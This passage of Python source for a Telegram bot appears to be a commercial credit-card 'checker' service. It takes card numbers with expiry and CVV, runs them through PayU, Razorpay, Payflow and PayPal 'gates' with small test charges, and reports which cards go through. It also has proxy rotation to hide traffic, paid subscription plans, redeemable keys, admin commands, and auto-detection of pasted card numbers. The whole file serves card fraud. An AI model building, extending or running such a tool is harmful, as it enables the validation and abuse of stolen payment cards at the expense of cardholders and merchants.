        await message.reply(f"{pick(FIRE_POOL)} {bold('Proxy list full!')} /clearuserproxy"); return
    status = await message.reply(f"{pick(TIME_POOL)} {bold('Testing proxies...')}\n\nParsed: {len(parsed)}")
    working, dead = [], 0
    for i in range(0, len(parsed), 10):
        if len(working) >= need: break
        batch = parsed[i:i+10]
        async def _t(p):
            try:
                r = await test_proxy_detailed(p["proxy_url"])
                return p if r.get("success") else None
            except Exception: return None
        rs = await asyncio.gather(*[_t(p) for p in batch])
        for r in rs:
            if r is not None and len(working) < need: working.append(r)
            elif r is None: dead += 1
        await safe_edit(status, f"{pick(TIME_POOL)} {bold('Testing proxies...')}\n\nWorking: {len(working)}/{need}\nDead: {dead}")
    if not working:
        await safe_edit(status, f"{pick(CROSS_POOL)} {bold('All proxies are dead!')}"); return
    add_user_proxies(uid, working)
    total = len(get_user_proxies(uid))
    await safe_edit(status, f"{pick(CHECK_POOL)} {bold('Proxy Testing Complete!')}\n\nWorking: {len(working)}\nDead: {dead}\nSaved: {total}/{MAX_PROXIES_PER_USER}")


@router.message(Command("clearuserproxy", "rmproxy"))
async def cmd_clearproxy(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard()); return
    lst = get_user_proxies(message.from_user.id)
    if not lst:
        await message.reply(f"{pick(FIRE_POOL)} {bold('No proxies to remove!')}"); return
    n = len(lst); del_user_proxy(message.from_user.id)
    await message.reply(f"{pick(CHECK_POOL)} {bold('Removed')} {n} {bold('proxies!')}")


@router.message(Command("chkproxy"))
async def cmd_chkproxy(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard()); return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"{pick(TIME_POOL)} {bold('Usage:')} /chkproxy host:port"); return
    p = parse_proxy_format(args[1].strip())
    if not p:
        await message.reply(f"{pick(CROSS_POOL)} {bold('Invalid proxy format!')}"); return
    status = await message.reply(f"{pick(TIME_POOL)} {bold('Testing proxy...')}")
    r = await test_proxy_detailed(p["proxy_url"])
    if r.get("success"):
        await safe_edit(status, f"{pick(CHECK_POOL)} {bold('Proxy ALIVE!')}\n\nIP: {r.get('ip')}")
    else:
        await safe_edit(status, f"{pick(CROSS_POOL)} {bold('Proxy DEAD!')}\n\n{r.get('error')}")


# ── SINGLE GATES ─────────────────────────────────────────────────────────────
async def _handle_gate_result(message, loading_msg, cc, gate_name, status_raw, response_text, user, t0):
    bi = {}
    try: bi = await bin_lookup(cc.split("|")[0][:6])
    except Exception: pass
    elapsed = time.time() - t0
    s = (status_raw or "").lower()
    bucket = "charged" if s == "charged" else "approved" if s == "approved" else "declined"
    await safe_edit(loading_msg, _result_ui(cc, bucket, response_text, bi, gate_name, "-", elapsed, user.full_name or "Unknown"))
    if bucket == "charged":
        try: await bot.pin_chat_message(message.chat.id, loading_msg.message_id, disable_notification=True)
        except Exception: pass
        await send_log_hit(str(response_text)[:120], "-", gate_name, user.full_name or "Unknown")


def _extract_gate_cc(message):
    cc = None
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc = extract_cc(args[1])
        if not cc:
            parts = re.split(r"[|/]", args[1].strip())
            if len(parts) >= 4: cc = "|".join(p.strip() for p in parts[:4])
    if not cc and message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc = extract_cc(rt)
    return cc


@router.message(Command("payu"))
async def cmd_payu(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard()); return
    uid = message.from_user.id
    if auth.is_banned(uid): return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb()); return
    cc = _extract_gate_cc(message)
    if not cc:
        await message.reply(f"{pick(FIRE_POOL)} {bold('No CC found!')}"); return
    loading = await message.reply(_checking_ui(cc)); t0 = time.time()
    try:
        processor = _payu_mod.PayUProcessor()
        try: result = await asyncio.get_running_loop().run_in_executor(CHECKER_POOL, processor.process, cc)
        finally:
            try: processor.cleanup()
            except Exception: pass
    except Exception as e:
        log.error("payu: %s", e, exc_info=True)
        await safe_edit(loading, f"{pick(CROSS_POOL)} {bold('PayU Error')}"); return
    await _handle_gate_result(message, loading, cc, "PayU 1$",
                              (result.get("status") or "").lower(),
                              result.get("value") or result.get("code") or "Unknown",
                              message.from_user, t0)


@router.message(Command("rz"))
async def cmd_rz(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard()); return
    uid = message.from_user.id
    if auth.is_banned(uid): return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb()); return
    cc = _extract_gate_cc(message)
    if not cc:
        await message.reply(f"{pick(FIRE_POOL)} {bold('No CC found!')}"); return
    loading = await message.reply(_checking_ui(cc)); t0 = time.time()
    try: result = await _rz_mod.check_gate(cc)
    except Exception as e:
        log.error("rz: %s", e, exc_info=True)
        await safe_edit(loading, f"{pick(CROSS_POOL)} {bold('Razorpay Error')}"); return
    await _handle_gate_result(message, loading, cc, "Razorpay 1₹",
                              (result.get("status") or "").lower(),
                              result.get("response") or "Unknown", message.from_user, t0)


@router.message(Command("pf"))
async def cmd_pf(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard()); return
    uid = message.from_user.id
    if auth.is_banned(uid): return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb()); return
    cc = _extract_gate_cc(message)
    if not cc:
        await message.reply(f"{pick(FIRE_POOL)} {bold('No CC found!')}"); return
    parts = cc.split("|")
    if len(parts) != 4:
        await message.reply(f"{pick(CROSS_POOL)} {bold('Invalid CC format!')}"); return
    cc_num, mm, yy, cvv = parts
    loading = await message.reply(_checking_ui(cc)); t0 = time.time()
    try: result = await asyncio.get_running_loop().run_in_executor(CHECKER_POOL, _pf_mod.process_card, cc_num, mm, yy, cvv)
    except Exception as e:
        log.error("pf: %s", e, exc_info=True)
        await safe_edit(loading, f"{pick(CROSS_POOL)} {bold('Payflow Error')}"); return
    await _handle_gate_result(message, loading, cc, "Payflow 5$",
                              (result.get("status") or "").lower(),
                              result.get("response") or "Unknown", message.from_user, t0)


@router.message(Command("pp"))
async def cmd_pp(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard()); return
    uid = message.from_user.id
    if auth.is_banned(uid): return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb()); return
    cc = _extract_gate_cc(message)
    if not cc:
        await message.reply(f"{pick(FIRE_POOL)} {bold('No CC found!')}"); return
    loading = await message.reply(_checking_ui(cc)); t0 = time.time()
    try: result = await _pp_mod.check_gate(cc)
    except Exception as e:
        log.error("pp: %s", e, exc_info=True)
        await safe_edit(loading, f"{pick(CROSS_POOL)} {bold('PayPal Error')}"); return
    await _handle_gate_result(message, loading, cc, "PayPal 0.10$",
                              (result.get("status") or "").lower(),
                              result.get("response") or "Unknown", message.from_user, t0)# ══════════════════════════════════════════════════════════════════════════════
#  PART 5 — Plans, key gen, redeem, admin, main
# ══════════════════════════════════════════════════════════════════════════════

def _fmt_time_left(seconds):
    if seconds <= 0: return "0m"
    d = int(seconds // 86400); h = int((seconds % 86400) // 3600); m = int((seconds % 3600) // 60)
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m or not parts: parts.append(f"{m}m")
    return " ".join(parts)


@router.message(Command("myplan"))
async def cmd_myplan(message: types.Message):
    uid = message.from_user.id
    if auth.is_banned(uid): return
    try:
        role = auth.get_user_role(uid); expiry = auth.get_premium_expiry(uid)
    except Exception: role, expiry = "free", "N/A"
    role_disp = {"owner":"Owner","admin":"Admin","premium":"Premium"}.get(role,"Free")
    try: unlimited = auth.has_unlimited_checks(uid)
    except Exception: unlimited = role in ("owner","admin","premium")
    checks_line = "Unlimited" if unlimited else "Locked"
    await message.reply(
        f"<code>[≡] {head('My Plan')} » {pick(GEM_POOL)}\n"
        f"{DIV}\n\n"
        f"[≡] {head('User')}    » {body(message.from_user.full_name or 'Unknown')} » {pick(HEART_POOL)}\n"
        f"[≡] {head('ID')}      » {digit(str(uid))} » {pick(LINK_POOL)}\n"
        f"[≡] {head('Role')}    » {body(role_disp)} » {pick(CROWN_POOL)}\n"
        f"[≡] {head('Expires')} » {digit(expiry) if expiry != 'N/A' else body('—')} » {pick(TIME_POOL)}\n"
        f"[≡] {head('Checks')}  » {body(checks_line)} » {pick(STAR_POOL)}\n"
        f"</code>"
    )


@router.message(Command("plans"))
async def cmd_plans(message: types.Message):
    await message.reply(
        f"<code>[≡] {head('Plans')} » {head('Access Plans')} » {pick(CROWN_POOL)}\n"
        f"{DIV}\n\n"
        f"[≡] {head('Trial')}     {body('Free')} » {pick(GIFT_POOL)}\n"
        f"[≡] {head('Duration')}  {body('3 Hours')} » {pick(TIME_POOL)}\n\n"
        f"[≡] {head('Weekly')}    ${digit('10')} » {pick(ROCKET_POOL)}\n"
        f"[≡] {head('Duration')}  {digit('7')} {body('Days')} » {pick(TIME_POOL)}\n\n"
        f"[≡] {head('Bi-Weekly')} ${digit('18')} » {pick(STAR_POOL)}\n"
        f"[≡] {head('Duration')}  {digit('15')} {body('Days')} » {pick(TIME_POOL)}\n\n"
        f"[≡] {head('Monthly')}   ${digit('30')} » {pick(CROWN_POOL)}\n"
        f"[≡] {head('Duration')}  {digit('30')} {body('Days')} » {pick(TIME_POOL)}\n\n"
        f"{DIV}\n\n"
        f"[≡] {head('Checks')} » {body('Unlimited')} » {pick(CHECK_POOL)}\n"
        f"[≡] {head('Redeem')} » /redeem {body('KEY')} » {pick(GIFT_POOL)}\n"
        f"[≡] {head('Owner')}  » {body(OWNER_NAME)} » {pick(CROWN_POOL)}\n"
        f"</code>"
    )


@router.message(Command("redeem"))
async def cmd_redeem(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /redeem 67-XXXXXXXX"); return
    if auth.is_premium(message.from_user.id):
        await message.reply(f"{pick(CROSS_POOL)} {bold('You already have premium!')}"); return
    ok, info = auth.redeem_key(message.from_user.id, args[1].strip())
    if ok:
        plan_name = "Premium"; max_uses = 0; slots_left = "—"
        if isinstance(info, dict):
            plan_name = info.get("plan") or info.get("duration") or "Premium"
            max_uses = int(info.get("max_uses") or 0)
            slots_left = info.get("slots_left") or "—"
        try: seconds_left = auth.get_premium_seconds_left(message.from_user.id) or 0
        except Exception: seconds_left = 0
        expires_line = _fmt_time_left(seconds_left) if seconds_left else "—"

        await message.reply(
            f"<code>[≡] {head('Access Granted')} » {head('Key Redeemed')} » {pick(CHECK_POOL)}\n"
            f"{DIV}\n\n"
            f"[≡] {head('Plan')}       » {body(plan_name)} » {pick(GEM_POOL)}\n"
            f"[≡] {head('Checks')}     » {body('Unlimited')} » {pick(STAR_POOL)}\n"
            f"[≡] {head('Expires')}    » {body(expires_line)} » {pick(TIME_POOL)}\n"
            f"[≡] {head('Slots Left')} » {digit(str(slots_left))}"
            + (f"/{digit(str(max_uses))}" if max_uses else "") + f" » {pick(CROWN_POOL)}\n\n"
            f"{DIV}\n\n"
            f"[≡] /sh » {body('card|mm|yy|cvv')} » {pick(STAR_POOL)}\n"
            f"[≡] /msh » {body('reply .txt file')} » {pick(STAR_POOL)}\n"
            f"[≡] /hit » {body('url card')} » {pick(CHECK_POOL)}\n"
            f"[≡] /myplan » {body('check your plan')} » {pick(ROBOT_POOL)}\n"
            f"</code>"
        )
    else:
        await message.reply(f"{pick(CROSS_POOL)} {bold('Redemption Failed!')}\n\n{info}")


# ── ADMIN ────────────────────────────────────────────────────────────────────
@router.message(Command("aadmin"))
async def cmd_aadmin(message: types.Message):
    if message.from_user.id != OWNER_ID: return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().lstrip("-").isdigit():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /aadmin <user_id>"); return
    target = int(args[1].strip())
    try: auth.add_admin(target)
    except Exception: pass
    await message.reply(f"{pick(CHECK_POOL)} {bold('Admin Added!')}\nID: {target}")


@router.message(Command("dadmin"))
async def cmd_dadmin(message: types.Message):
    if message.from_user.id != OWNER_ID: return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().lstrip("-").isdigit():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /dadmin <user_id>"); return
    target = int(args[1].strip())
    try: auth.remove_admin(target)
    except Exception: pass
    await message.reply(f"{pick(CHECK_POOL)} {bold('Admin Removed!')}\nID: {target}")


@router.message(Command("admin"))
async def cmd_admin(message: types.Message):
    if message.from_user.id != OWNER_ID: return
    await message.reply(
        f"<code>[≡] {head('Owner')} » {head('Command List')} » {pick(CROWN_POOL)}\n"
        f"{DIV}\n\n"
        f"[≡] {head('Admin')} » {pick(LINK_POOL)}\n"
        f"[≡] /aadmin &lt;id&gt; » {body('Add admin')}\n"
        f"[≡] /dadmin &lt;id&gt; » {body('Remove admin')}\n\n"
        f"[≡] {head('User')} » {pick(LINK_POOL)}\n"
        f"[≡] /ban &lt;id&gt; » {body('Ban user')}\n"
        f"[≡] /unban &lt;id&gt; » {body('Unban user')}\n"
        f"[≡] /auth &lt;id&gt; [days] » {body('Grant premium')}\n"
        f"[≡] /unauth &lt;id&gt; » {body('Remove premium')}\n\n"
        f"[≡] {head('Key')} » {pick(GIFT_POOL)}\n"
        f"[≡] /key days max_uses » {body('Generate 67-XXXXXXXX')}\n\n"
        f"[≡] {head('Broadcast')} » {pick(ROCKET_POOL)}\n"
        f"[≡] /broadcast &lt;text&gt;\n\n"
        f"[≡] {head('Maint')} » {pick(SKULL_POOL)}\n"
        f"[≡] /maintain &lt;reason&gt;\n"
        f"[≡] /maintaingood\n\n"
        f"[≡] {body('Maintenance')}: {body('ACTIVE') if in_maintenance() else body('OFF')}</code>"
    )


@router.message(Command("ban"))
async def cmd_ban(message: types.Message):
    if not auth.is_admin(message.from_user.id): return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().lstrip("-").isdigit():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /ban user-id"); return
    auth.ban_user(int(args[1].strip()))
    await message.reply(f"{pick(CHECK_POOL)} {bold('User Banned!')}")


@router.message(Command("unban"))
async def cmd_unban(message: types.Message):
    if not auth.is_admin(message.from_user.id): return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().lstrip("-").isdigit():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /unban user-id"); return
    auth.unban_user(int(args[1].strip()))
    await message.reply(f"{pick(CHECK_POOL)} {bold('User Unbanned!')}")


@router.message(Command("auth"))
async def cmd_auth(message: types.Message):
    if not auth.is_admin(message.from_user.id): return
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /auth user-id [days]"); return
    target = int(args[1])
    days = int(args[2]) if len(args) >= 3 and args[2].isdigit() else 0
    try: auth.auth_user(target, days=days, by=message.from_user.id)
    except Exception: pass
    exp = "Lifetime" if days == 0 else f"{days} days"
    await message.reply(f"{pick(CHECK_POOL)} {bold('Premium Granted!')}\nID: {target}\nPlan: {exp}")


@router.message(Command("unauth"))
async def cmd_unauth(message: types.Message):
    if not auth.is_admin(message.from_user.id): return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].isdigit():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /unauth user-id"); return
    try: auth.unauth_user(int(args[1]))
    except Exception: pass
    await message.reply(f"{pick(CHECK_POOL)} {bold('Premium Removed!')}")


@router.message(Command("key"))
async def cmd_key(message: types.Message):
    if not auth.is_admin(message.from_user.id): return
    args = message.text.split()
    if len(args) < 3 or not all(a.isdigit() for a in args[1:3]):
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /key days max_uses\n\nExample: /key 2 100"); return
    days = int(args[1]); max_uses = int(args[2])
    key = _gen_key()
    try:
        if hasattr(auth, "register_key"):
            auth.register_key(key, users=max_uses, days=days, max_uses=max_uses, by=message.from_user.id)
        else:
            auth.generate_keys(max_uses, days, created_by=message.from_user.id)
    except Exception as e: log.warning("key: %s", e)
    plan_label = f"{days} Day" + ("s" if days != 1 else "")
    await message.reply(
        f"<code>[≡] {head('Key')} » {head('Generated')} » {pick(CHECK_POOL)}\n"
        f"{DIV}\n\n"
        f"[≡] {head('Key')}       » <code>{key}</code>\n"
        f"[≡] {head('Plan')}      » {body(plan_label)} » {pick(GIFT_POOL)}\n"
        f"[≡] {head('Duration')}  » {body(plan_label)} » {pick(TIME_POOL)}\n"
        f"[≡] {head('Max Uses')}  » {digit(str(max_uses))} » {pick(CROWN_POOL)}\n\n"
        f"{DIV}\n\n"
        f"[≡] {head('Redeem')} » /redeem {body('KEY')} » {pick(GIFT_POOL)}\n"
        f"</code>"
    )


@router.message(Command("maintain"))
async def cmd_maintain(message: types.Message):
    if message.from_user.id != OWNER_ID: return
    args = message.text.split(maxsplit=1)
    reason = args[1].strip() if len(args) > 1 else "Scheduled maintenance"
    _maintenance.update({"active": True, "reason": reason, "by": message.from_user.id, "since": int(time.time())})
    _save_maintenance()
    await message.reply(f"{pick(FIRE_POOL)} {bold('Maintenance ON')}\n\nReason: {reason}")


@router.message(Command("maintaingood"))
async def cmd_maintaingood(message: types.Message):
    if message.from_user.id != OWNER_ID: return
    _maintenance.update({"active": False, "reason": "", "by": 0, "since": 0})
    _save_maintenance()
    await message.reply(f"{pick(CHECK_POOL)} {bold('Maintenance OFF')}")


@router.message(Command("broadcast", "broad"))
async def cmd_broadcast(message: types.Message):
    if message.from_user.id != OWNER_ID: return
    args = message.text.split(maxsplit=1)
    body_text = args[1].strip() if len(args) > 1 else ""
    src_msg = message.reply_to_message if message.reply_to_message else None
    if not body_text and not src_msg:
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /broadcast <text> or reply to a message"); return
    try: user_ids = auth.get_all_user_ids()
    except Exception: user_ids = []
    if not user_ids:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No users found.')}"); return
    status = await message.reply(f"{pick(ROCKET_POOL)} {bold('Broadcasting...')}\n\nTotal: {len(user_ids)}")
    sent = failed = blocked = 0
    for uid in user_ids:
        try:
            if src_msg: await bot.copy_message(uid, src_msg.chat.id, src_msg.message_id)
            else: await bot.send_message(uid, body_text)
            sent += 1
        except TelegramForbiddenError: blocked += 1
        except TelegramRetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
            try:
                if src_msg: await bot.copy_message(uid, src_msg.chat.id, src_msg.message_id)
                else: await bot.send_message(uid, body_text)
                sent += 1
            except Exception: failed += 1
        except Exception: failed += 1
    await safe_edit(status, f"{pick(CHECK_POOL)} {bold('Broadcast Complete')}\n\nTotal: {len(user_ids)}\nSent: {sent}\nBlocked: {blocked}\nFailed: {failed}")


@router.message(F.text & ~F.text.startswith("/"))
async def handle_plain(message: types.Message):
    if message.chat.type != "private": return
    text = message.text or ""
    ccs = []
    for m in CC_PATTERN.finditer(text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in ccs: ccs.append(cc)
    if not ccs: return
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard()); return
    if not has_active_plan(message.from_user.id, message.chat.id):
        await message.reply(access_denied_msg(message.from_user.id), reply_markup=access_denied_kb()); return
    if len(ccs) == 1:
        await message.reply(f"{pick(FIRE_POOL)} {bold('CC Detected!')}\n\n<tg-spoiler>{ccs[0]}</tg-spoiler>\n\nUse /sh to check.")
    else:
        await message.reply(f"{pick(FIRE_POOL)} {bold(f'{len(ccs)} CCs Detected!')}\n\nUse /msh to mass check.")


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════

async def main():
    me = await bot.get_me()
    log.info(f"⚡ Bot @{me.username} running (v10)...")
    if in_maintenance(): log.warning("⚠ Maintenance ACTIVE")
    await bot.delete_webhook(drop_pending_updates=True)
    try:
        await dp.start_polling(bot, skip_updates=True,
                               allowed_updates=["message","edited_message","callback_query",
                                                "chat_member","my_chat_member","chat_join_request"])
    finally:
        CHECKER_POOL.shutdown(wait=False)
        try: await close_session()
        except Exception: pass
        await bot.session.close()


if __name__ == "__main__":
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = min(65536, hard)
        if soft < target:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
            log.info(f"📂 Raised fd: {soft} → {target}")
    except Exception: pass
    try: asyncio.run(main())
    except (KeyboardInterrupt, SystemExit): log.info("Bot stopped.")